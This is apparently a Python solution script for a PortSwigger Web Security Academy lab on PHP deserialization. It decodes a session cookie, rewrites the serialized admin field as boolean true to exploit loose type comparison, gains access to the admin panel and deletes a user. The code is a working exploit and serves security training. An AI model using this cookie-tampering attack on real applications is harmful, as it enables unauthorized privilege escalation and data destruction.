"""
Lab 2: Modifying serialized data types
https://portswigger.net/web-security/deserialization/exploiting/lab-modifying-serialized-data-types
Difficulty: Apprentice

📝 PHP's loose typing/comparison is the bug here: a field normally a
string (e.g. an "accessToken" that's checked with ==) can be re-serialized
as a BOOLEAN or an empty array instead — and PHP's loose comparison can
treat that unexpected type as satisfying an admin check that was only ever
meant to compare strings.
"""

import base64

from utils import get_session, log, note, php_serialize

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
WIENER = {"username": "wiener", "password": "peter"}


def run():
    s = get_session()
    r = s.post(f"{TARGET}/login", data=WIENER)
    cookie = s.cookies.get("session")
    decoded = base64.b64decode(cookie).decode()
    note(f"Decoded: {decoded}")

    # Replace the admin field's STRING serialization with a boolean `true`
    # instead of just changing its value — this is the type-confusion step.
    import re
    modified = re.sub(
        r's:\d+:"admin";s:\d+:"[^"]*";',
        's:5:"admin";b:1;',
        decoded,
    )
    note(f"Type-confused: {modified}")

    new_cookie = base64.b64encode(modified.encode()).decode()
    s.cookies.set("session", new_cookie)

    r = s.get(f"{TARGET}/admin")
    log(f"/admin status: {r.status_code}")
    if r.status_code == 200:
        r = s.post(f"{TARGET}/admin/delete", params={"username": "carlos"})
        log(f"Delete carlos responded {r.status_code}")
    else:
        note("If this fails, the vulnerable field/expected type may differ —")
        note("inspect the decoded cookie structure first and adjust the regex")
        note("to target whichever field controls privilege in this instance.")


if __name__ == "__main__":
    run()
